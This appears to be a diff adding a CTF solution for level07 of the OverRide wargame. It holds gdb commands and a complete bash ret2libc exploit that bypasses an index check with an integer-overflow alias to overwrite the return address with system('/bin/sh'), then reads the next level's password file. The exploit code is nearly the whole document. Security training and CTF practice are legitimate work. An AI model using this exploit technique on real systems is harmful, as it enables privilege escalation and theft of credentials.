@@ -1,0 +1,34 @@
+scp -P 2223 level07@localhost:level07 /home/ncardozo/Documents/OverRide
+
+gdb ./level07
+break main
+run
+print system
+print exit
+find &system, +99999999, '/bin/sh"
+
+
+cat > /tmp/pwn07.sh << 'EOF'
+#!/bin/bash
+N=114                   # RET_INDEX real
+SYSTEM=0xf7e6aed0       # p system
+FAKERET=0xf7e5eb70      # p exit
+BINSH=0xf7f897ec        # find "/bin/sh"
+# ========================================================
+BIN=/home/users/level07/level07
+
+alias_idx(){ local n=$1; if (( n % 3 != 0 )); then echo $n; else echo $(( n + (1<<30) )); fi; }
+I0=$(alias_idx $N)          # ret        -> system
+I1=$(alias_idx $((N+1)))    # ret falso  -> exit
+I2=$(alias_idx $((N+2)))    # argumento  -> /bin/sh
+
+printf '[*] N=%d  I0=%d  I1=%d  I2=%d\n' $N $I0 $I1 $I2
+cd /home/users/level07 || exit 1
+( printf 'store\n%d\n%d\nstore\n%d\n%d\nstore\n%d\n%d\nquit\n' \
+    $((SYSTEM)) $I0 $((FAKERET)) $I1 $((BINSH)) $I2; cat ) | setarch i386 -R "$BIN"
+EOF
+chmod +x /tmp/pwn07.sh
+
+/tmp/pwn07.sh
+id
+cat /home/users/level08/.pass
